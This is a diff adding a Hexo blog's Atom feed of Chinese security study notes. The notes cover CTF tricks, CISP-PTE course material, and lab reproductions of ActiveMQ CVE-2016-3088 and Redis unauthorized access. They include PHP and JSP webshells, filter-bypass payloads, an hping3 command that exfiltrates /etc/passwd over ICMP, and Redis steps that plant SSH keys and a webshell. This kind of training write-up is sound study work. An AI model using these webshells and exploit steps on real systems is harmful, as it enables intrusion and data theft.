@@ -1,0 +1,458 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Saltneko</title>
+  
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2021-04-28T17:34:39.000Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>Salt</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CTF笔记</title>
+    <link href="http://yoursite.com/2021/04/26/CTFHUB-SSRF/"/>
+    <id>http://yoursite.com/2021/04/26/CTFHUB-SSRF/</id>
+    <published>2021-04-26T14:05:00.000Z</published>
+    <updated>2021-04-28T17:34:39.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="#信息泄漏"></a>#信息泄漏</h3><p>目录遍历工具：disearch<br>.git文件恢复工具：GitHack</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br><span class="line">git diff --head &#x2F;&#x2F;比较不同</span><br><span class="line">git reset --head &#x2F;&#x2F;恢复到某版本</span><br><span class="line">git stash list &#x2F;&#x2F;查看保存的工作现场列表    </span><br><span class="line">git stash pop &#x2F;&#x2F;恢复工作现场    </span><br><span class="line">git stash show &#x2F;&#x2F;显示做了哪些改动  </span><br><span class="line">git stash show -p &#x2F;&#x2F;显示第一个保存的工作现场的改动</span><br></pre></td></tr></table></figure><p>svn泄漏/hg泄漏工具：dvcs-ripper</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="#文件包含"></a>#文件包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#39;ls &#x2F;&#39;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="#命令执行"></a>#命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval(\$_POST[&#39;a&#39;]);?&gt;&quot; &gt;&gt; shell.php</span><br><span class="line">分隔符被过滤--&gt;%0a %0d</span><br><span class="line">空格被过滤--&gt;IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</span><br></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="#SSRF"></a>#SSRF</h3><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="#伪协议"></a>#伪协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;</span><br><span class="line">dict:&#x2F;&#x2F;</span><br><span class="line">sftp:&#x2F;&#x2F;</span><br><span class="line">ldap:&#x2F;&#x2F;</span><br><span class="line">tftp:&#x2F;&#x2F;</span><br><span class="line">gopher:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>file:///var/www/html/flag.php //查看源代码<br>dict://127.0.0.1:$port$ //结合burp扫码端口</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;信息泄漏&quot;&gt;&lt;a href=&quot;#信息泄漏&quot; class=&quot;headerlink&quot; title=&quot;#信息泄漏&quot;&gt;&lt;/a&gt;#信息泄漏&lt;/h3&gt;&lt;p&gt;目录遍历工具：disearch&lt;br&gt;.git文件恢复工具：GitHack&lt;/p&gt;
+&lt;figure class=&quot;hig
+      
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>CISP-PTE课程</title>
+    <link href="http://yoursite.com/2021/04/18/CISP-PTE%E8%AF%BE%E7%A8%8B/"/>
+    <id>http://yoursite.com/2021/04/18/CISP-PTE课程/</id>
+    <published>2021-04-18T01:02:21.000Z</published>
+    <updated>2021-04-19T03:50:37.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="操作系统安全"><a href="#操作系统安全" class="headerlink" title="#操作系统安全"></a>#操作系统安全</h3><h4 id="WIndows操作系统安全"><a href="#WIndows操作系统安全" class="headerlink" title="#WIndows操作系统安全"></a>#WIndows操作系统安全</h4><p>windows的用户标识：SID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">administartor:500--0x1f4</span><br><span class="line">guest:501--ox1f5</span><br><span class="line">普通用户：从1000开始--ox3e8</span><br><span class="line">内置账号：</span><br><span class="line">system</span><br><span class="line">    local service</span><br><span class="line">    network service</span><br></pre></td></tr></table></figure><p>C：\windows\system32\config\SAM<br>HKEY_LOCAL+MACHINE\SAM\SAM\Domains\Account\Users\Names<br>查看用户SID：whoami/user<br>查看组SID：whoami/groups<br>查看用户特权：whoami/priv<br>查看服务SID：sc showsid server_name</p><a id="more"></a><p>用户克隆：把管理员F值赋值到普通用户上<br>信道保护：记时 存储<br>hping3 ip_address -d size –icmp –file /etc/passwd //利用icmp信道传输/etc/passwd文件</p><p>知其所需，最小特权</p><p>日志：系统日志/设备日志/web日志/监控日志</p><p>系统system：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1074，查看计算机的开机、关机、重启的时间以及原因和注释。</span><br><span class="line">6005，表示日志服务已启动，用来判断正常开机进入系统。</span><br><span class="line">6006，表示日志服务已停止，用来判断系统关机。</span><br><span class="line">6009，表示非正常关机， 按ctrl、alt、delete键关机。</span><br><span class="line">41，表示系统在未先正常关机的情况下重新启动。当出现意外断电关机、系统崩溃时，出现此事件ID。</span><br><span class="line">4199，当发生TCP&#x2F;IP地址冲突的时候，出现此事件ID，用来排查用户IP网络的问题。</span><br><span class="line">35,36,37，记录时间客户端状态信息，35表示更改时间源，36表示时间同步失败，37表示时间同步正常</span><br><span class="line">134，当出现时间同步源DNS解析失败时会出现此事件ID。</span><br><span class="line">7045，服务创建成功</span><br><span class="line">7030，服务创建失败</span><br></pre></td></tr></table></figure><p>安全Security:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4624，表示成功登陆的用户，用来筛选该系统的用户登陆成功情况。</span><br><span class="line">4625，表示登陆失败的用户。</span><br><span class="line">4672，表示授予了特殊权限</span><br><span class="line">4720,4722,4723,4724,4725,4726,4738,4740，事件ID表示当用户帐号发生创建，删除，改变密码时的事件记录。</span><br><span class="line">4727,4737,4739,4762，表示当用户组发生添加、删除时或组内添加成员时生成该事件。</span><br></pre></td></tr></table></figure><p>Windows认证：<br>&nbsp; &nbsp; 本地认证：GINA-LISA-SAM-用户数据<br>&nbsp; &nbsp; 远程认证：SMB-LM-NTLM-Keyberos<br>&nbsp; &nbsp; 访问控制：（授权）<br>    &nbsp; &nbsp; ACL：访问控制列表<br>    &nbsp; &nbsp; CL：访问能力表</p><p>主体：发起访问者<br>客体：被访问者<br>权限：主体对客体的操作能力</p><p>NTFS权限：（ACL和ACE）<br>&nbsp; &nbsp; 仅NTFS支持<br>&nbsp; &nbsp; 权限累计和继承<br>&nbsp; &nbsp;文件权限高于文件夹权限<br>&nbsp; &nbsp;移动和复制对于权限的影响<br>&nbsp; &nbsp;拒绝权限优先<br>&nbsp; &nbsp;特殊权限：<br>            &nbsp; &nbsp;读取权限<br>            &nbsp; &nbsp;修改权限<br>            &nbsp; &nbsp;取得所有权</p><p>Windows特权管理：User Account Control<br>&nbsp; &nbsp;完全访问令牌<br>&nbsp; &nbsp;标准受限访问令牌</p><p>windows默认日志：<br>&nbsp; &nbsp;security.evtx<br>&nbsp; &nbsp;system.evtx<br>&nbsp; &nbsp;application.evtx</p><p>关闭默认共享：<br> 1.关闭临时共享：net share shared_name /del<br> 2.永久关闭共享：net stop server<br> 3.修改注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parametes<br> 建立IPC连接：net use \ip\ipc$ //输入用户名和密码<br> 建立默认共享映射：net use k: \ip\c$ //映射不存在的磁盘</p><p>关闭防火墙指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Win10:</span><br><span class="line">关闭防火墙：netsh firewall set opmode mode&#x3D;disable</span><br><span class="line">开启防火墙：netsh firewall set opmode mode&#x3D;enable</span><br><span class="line">查看防火墙状态：netsh Advfirewall show allprofiles</span><br><span class="line">防火墙恢复默认配置：netsh firewall reset</span><br><span class="line">添加访问规则，允许IP 192.168.1.105通过Telnet访问主机：netsh firewall set portopening tcp 23 telnet enable custom 192.168.1.105</span><br><span class="line"></span><br><span class="line">win2008</span><br><span class="line">关闭防火墙：netsh advfirewall set allprofiles state off</span><br><span class="line">开启防火墙：netsh advfirewall set allprofiles state on</span><br></pre></td></tr></table></figure><p>新建用户：<code>net user username new_passwd /add</code><br>用户加入管理员组：<code>net localgroups administartors username /add</code><br>修改文件权限：<code>cacals 文件路径 /G everyone:F</code>(WRCF) /<code>echo y|cacals 文件路径 /G everyone:F</code></p><p>内网渗透：<br>&nbsp; &nbsp;Active Directory:活动目录<br>&nbsp; &nbsp;安装域控制器条件：<br>&nbsp; &nbsp;1.静态IP地址<br>&nbsp; &nbsp;2.最少一个NTFS文件系统<br>&nbsp; &nbsp;3.管理员权限<br>&nbsp; &nbsp;4.操作系统版本支持（server2008及以前系统：dcpromo/2012及以后系统：先安全角色，再提升为dc）<br>&nbsp; &nbsp;5.DNS支持<br>    域基本概念：<br>        &nbsp; &nbsp;更新组策略：gpupdate /force<br>        &nbsp; &nbsp;域授权规则：AGDLP<br>        &nbsp; &nbsp;组的作用域：<br>            &nbsp; &nbsp;全局组：作用到全林<br>            &nbsp; &nbsp;通用组：作用到全林，存放在GC中<br>            &nbsp; &nbsp;本地域组：<br>        &nbsp; &nbsp;组策略应该顺序：冲突（后覆盖前）/不冲突（累加）</p><h4 id="Linux："><a href="#Linux：" class="headerlink" title="#Linux："></a>#Linux：</h4><p>TCP_Wrappers:仅支持TCP协议<br>TCP_Wrappers配置文件<br>&nbsp; &nbsp;/etc/hosts.allow<br>&nbsp; &nbsp;/etc/hosts.deny<br>Liunx账号：UID/GID<br>Linux用户ID：<br>&nbsp; &nbsp;root：0<br>&nbsp; &nbsp;系统和程序用户：1-999<br>&nbsp; &nbsp;普通用户：1000开始</p><p>Linux设置权限工具：<br>&nbsp; &nbsp;chmod<br>&nbsp; &nbsp;chown<br>&nbsp; &nbsp;setfacl<br>&nbsp; &nbsp;chattr</p><p>Linux默认权限设置：umask（默认值为0022）<br>Linux文件类型：<br>&nbsp; &nbsp;-：file<br>&nbsp; &nbsp;d:directory<br>&nbsp; &nbsp;s:sockets<br>&nbsp; &nbsp;p:pipe<br>&nbsp; &nbsp;l:link<br>&nbsp; &nbsp;c:character<br>&nbsp; &nbsp;b:block</p><p>rw-    r–    r–<br>owner  group  other</p><p>Linux日志：/var/log<br>&nbsp; &nbsp;message：系统日志<br>&nbsp; &nbsp;dmesg:内核日志<br>&nbsp; &nbsp;boot.log:启动日志</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;操作系统安全&quot;&gt;&lt;a href=&quot;#操作系统安全&quot; class=&quot;headerlink&quot; title=&quot;#操作系统安全&quot;&gt;&lt;/a&gt;#操作系统安全&lt;/h3&gt;&lt;h4 id=&quot;WIndows操作系统安全&quot;&gt;&lt;a href=&quot;#WIndows操作系统安全&quot; class=&quot;headerlink&quot; title=&quot;#WIndows操作系统安全&quot;&gt;&lt;/a&gt;#WIndows操作系统安全&lt;/h4&gt;&lt;p&gt;windows的用户标识：SID&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;administartor:500--0x1f4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;guest:501--ox1f5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;普通用户：从1000开始--ox3e8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;内置账号：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	system&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    local service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    network service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;C：\windows\system32\config\SAM&lt;br&gt;HKEY_LOCAL+MACHINE\SAM\SAM\Domains\Account\Users\Names&lt;br&gt;查看用户SID：whoami/user&lt;br&gt;查看组SID：whoami/groups&lt;br&gt;查看用户特权：whoami/priv&lt;br&gt;查看服务SID：sc showsid server_name&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ActiveMQ CVE-2015-5254 反序列化漏洞</title>
+    <link href="http://yoursite.com/2021/04/15/Untitled/"/>
+    <id>http://yoursite.com/2021/04/15/Untitled/</id>
+    <published>2021-04-15T14:20:00.000Z</published>
+    <updated>2021-04-18T08:01:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="#漏洞原理"></a>#漏洞原理</h3><p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p><h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="#复现步骤"></a>#复现步骤</h3><ul><li>构造（可以使用ysoserial）可执行命令的序列化对象<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;matthiaskaiser&#x2F;jmet&#x2F;releases&#x2F;download&#x2F;0.1.0&#x2F;jmet-0.1.0-all.jar</span><br></pre></td></tr></table></figure></li><li>作为一个消息，发送给目标61616端口</li><li>访问的Web管理页面，读取消息，触发漏洞</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;#漏洞原理&quot;&gt;&lt;/a&gt;#漏洞原理&lt;/h3&gt;&lt;p&gt;该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JM
+      
+    
+    </summary>
+    
+    
+      <category term="Vulhub" scheme="http://yoursite.com/categories/Vulhub/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ActiveMQ CVE-2016-3088 任意文件写入漏洞</title>
+    <link href="http://yoursite.com/2021/04/14/vulhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <id>http://yoursite.com/2021/04/14/vulhub靶场练习/</id>
+    <published>2021-04-14T15:09:00.000Z</published>
+    <updated>2021-04-15T14:20:28.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="#漏洞原理"></a>#漏洞原理</h3><p>fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要PUT写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p><h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="#复现步骤"></a>#复现步骤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps &#x2F;&#x2F;查看端口</span><br></pre></td></tr></table></figure><ul><li>页面登陆ip:8800端口</li><li>登陆账号 admin/admin</li><li>进入fileserver页面 抓包<a id="more"></a>shell脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><img src="/images/pasted-275.png" alt="upload successful"></li><li>shell成功上传<br><img src="/images/pasted-281.png" alt="upload successful"><br>移动文件到可以解析jsp文件的路径：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1．&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api</span><br><span class="line">2．&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;admin</span><br></pre></td></tr></table></figure><img src="/images/pasted-278.png" alt="upload successful"></li><li>访问webshell<br><img src="/images/pasted-282.png" alt="upload successful"><br><img src="/images/pasted-283.png" alt="upload successful"></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;#漏洞原理&quot;&gt;&lt;/a&gt;#漏洞原理&lt;/h3&gt;&lt;p&gt;fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要PUT写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。&lt;/p&gt;
+&lt;h3 id=&quot;复现步骤&quot;&gt;&lt;a href=&quot;#复现步骤&quot; class=&quot;headerlink&quot; title=&quot;#复现步骤&quot;&gt;&lt;/a&gt;#复现步骤&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker ps &amp;#x2F;&amp;#x2F;查看端口&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;页面登陆ip:8800端口&lt;/li&gt;
+&lt;li&gt;登陆账号 admin/admin&lt;/li&gt;
+&lt;li&gt;进入fileserver页面 抓包
+    
+    </summary>
+    
+    
+      <category term="Vulhub" scheme="http://yoursite.com/categories/Vulhub/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>redis未授权访问</title>
+    <link href="http://yoursite.com/2021/03/29/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    <id>http://yoursite.com/2021/03/29/redis未授权访问/</id>
+    <published>2021-03-29T13:55:00.000Z</published>
+    <updated>2021-03-29T14:01:33.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="redis的安装"><a href="#redis的安装" class="headerlink" title="#redis的安装"></a>#redis的安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.11.tar.gz &#x2F;&#x2F;下载redis</span><br><span class="line">tar zxvf redis-3.2.11.tar.gz &#x2F;&#x2F;解压</span><br><span class="line">cd redis-3.2.11</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">cp redis.conf &#x2F;etc&#x2F;</span><br><span class="line">cd &#x2F;src&#x2F;</span><br><span class="line">cp redis-server &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">cp redis-cli &#x2F;use&#x2F;bin&#x2F;</span><br><span class="line">cd ..&#x2F;</span><br><span class="line">vim &#x2F;etc&#x2F;redis.conf</span><br><span class="line">redis-server &#x2F;etc&#x2F;redis.conf</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="/images/pasted-272.png" alt="upload successful"><br><img src="/images/pasted-273.png" alt="upload successful"><br>*报错1：gcc：命令未找到<br>yum install gcc-c++<br>*报错2：You need tcl 8.5 or newer in order to run the Redis test<br>wget <a href="http://downloads.sourceforge.net/tcl/tcl8.6.1-src.tar.gz" target="_blank" rel="noopener">http://downloads.sourceforge.net/tcl/tcl8.6.1-src.tar.gz</a><br>sudo tar xzvf tcl8.6.1-src.tar.gz -C /usr/local/<br>cd /usr/local/tcl8.6.1/unix/<br>sudo ./configure<br>sudo make<br>sudo make install<br>*报错3：致命错误：jemalloc/jemalloc.h：没有那个文件或目录<br>make MALLOC=libc</p><h3 id="验证未授权访问"><a href="#验证未授权访问" class="headerlink" title="#验证未授权访问"></a>#验证未授权访问</h3><h4 id="写入ssh公钥，获取操作系统权限"><a href="#写入ssh公钥，获取操作系统权限" class="headerlink" title="#写入ssh公钥，获取操作系统权限"></a>#写入ssh公钥，获取操作系统权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ifconfig</span><br><span class="line">cd redis-3.2.11</span><br><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">cd redis-3.2.11</span><br><span class="line">redis-cli -h 靶机地址</span><br><span class="line">keys * &#x2F;&#x2F;返回（empty list or set)</span><br><span class="line">exit</span><br><span class="line">ssh root@靶机地址 &#x2F;&#x2F;提示需要密码</span><br><span class="line">Ctrl+C 退出</span><br><span class="line">ssh-keygen -t rsa &#x2F;&#x2F;生成ssh公钥</span><br><span class="line">cd &#x2F;root&#x2F;.ssh</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;)&gt;key.txt &#x2F;&#x2F;公钥写入key.txt文件</span><br><span class="line">cp key.txt &#x2F;redis-3.2.11&#x2F;</span><br><span class="line">cd &#x2F;redis-3.2.11&#x2F;</span><br><span class="line">cat key.txt|redis-cli -h 靶机地址 -x set crack &#x2F;&#x2F;写入文件</span><br><span class="line">redis-cli -h 靶机地址 &#x2F;&#x2F;远程登陆靶机redis服务</span><br><span class="line">get crack</span><br><span class="line">config get dir</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh &#x2F;&#x2F;切换redis数据文件保存目录为.ssh</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot; &#x2F;&#x2F;设置上传公钥的备份文件名字为authorized_keys</span><br><span class="line">save</span><br><span class="line">exit</span><br><span class="line">ssh root@靶机地址</span><br><span class="line">成功登陆</span><br></pre></td></tr></table></figure><p>*报错1：No route to host<br>靶机设置：<br>firewall-cmd –query-port=6379/tcp //查看6379端口是否对外开放<br>firewall-cmd –add-port=6379/tcp –permanent //开放6379端口<br>systemctl status firewalld //重启防火墙<br>firewall-cmd –list-ports //查看开放端口</p><h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="#写入webshell"></a>#写入webshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">yum update httpd</span><br><span class="line">yum install httpd</span><br><span class="line">systemctl start httpd</span><br><span class="line">firewall-cmd --add-port&#x3D;80&#x2F;tcp --permanent &#x2F;&#x2F;开放80端口</span><br><span class="line">systemctl status firewalld &#x2F;&#x2F;重启防火墙</span><br><span class="line">浏览器访问对应靶机地址，显示该界面</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-271.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">redis-cli -h 靶机地址</span><br><span class="line">config set dir &#x2F;vat&#x2F;www&#x2F;html</span><br><span class="line">set xxx &quot;\n\n&lt;?php @eval($_POST[&#39;salt&#39;]);?&gt;\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line">save</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;redis的安装&quot;&gt;&lt;a href=&quot;#redis的安装&quot; class=&quot;headerlink&quot; title=&quot;#redis的安装&quot;&gt;&lt;/a&gt;#redis的安装&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wget http:&amp;#x2F;&amp;#x2F;download.redis.io&amp;#x2F;releases&amp;#x2F;redis-3.2.11.tar.gz &amp;#x2F;&amp;#x2F;下载redis&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tar zxvf redis-3.2.11.tar.gz &amp;#x2F;&amp;#x2F;解压&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd redis-3.2.11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;make test&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cp redis.conf 